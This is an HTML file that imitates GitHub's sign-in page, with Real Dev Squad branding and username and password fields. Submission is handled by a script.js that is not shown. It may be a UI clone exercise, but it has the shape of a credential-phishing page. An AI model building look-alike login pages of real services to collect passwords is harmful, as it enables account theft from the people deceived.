<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<link
			rel="shortcut icon"
			type="image/png"
			href="../img/PNG/GitHub-Mark-32px.png"
		/>
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="style.css" />
		<title>Sign in to GitHub Â· GitHub</title>
		<script type="text/javascript" src="mixpanelImport.js"></script>
		<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
		<script type="module" src="script.js"></script>
	</head>
	<body>
		<div class="wrapper">
			<div class="logo">
				<img src="../img/PNG/GitHub-Mark-120px-plus.png" alt="GitHub" />
			</div>
			<form class="form">
				<div class="rds-logo">
					<img
						src="../img/PNG/Real-Dev-Squad@1x.png"
						alt="RDS-logo"
						class="rds-img"
					/>
				</div>
				<div class="title">
					<p class="sign-in-title">
						Sign in to <strong>GitHub</strong><br />
						to continue to
						<strong>Real Dev Squad</strong>
					</p>
				</div>
				<div class="form-section">
					<div class="input-field">
						<label>Username or email address</label>
						<input type="text" class="input" id="emailAddress" />
					</div>
					<div class="input-field input-password">
						<label>Password</label>
						<input type="password" class="input" id="password" />
						<a href="#" class="forgot">Forgot password?</a>
					</div>
					<div class="btn">
						<input type="submit" value="Sign in" class="sign_btn" id="signin" />
					</div>
				</div>
			</form>
			<div class="create_act">
				<p>
					New to GitHub?
					<a href="https://github.com/signup">Create an account.</a>
				</p>
			</div>
			<div class="footer">
				<ul>
					<li>
						<a
							href="https://docs.github.com/en/github/site-policy/github-terms-of-service"
							>Terms</a
						>
					</li>
					<li>
						<a
							href="https://docs.github.com/en/github/site-policy/github-privacy-statement"
							>Privacy</a
						>
					</li>
					<li><a href="https://github.com/security">Security</a></li>
					<li>
						<a href="https://support.github.com/request">Contact GitHub</a>
					</li>
				</ul>
			</div>
		</div>
	</body>
</html>
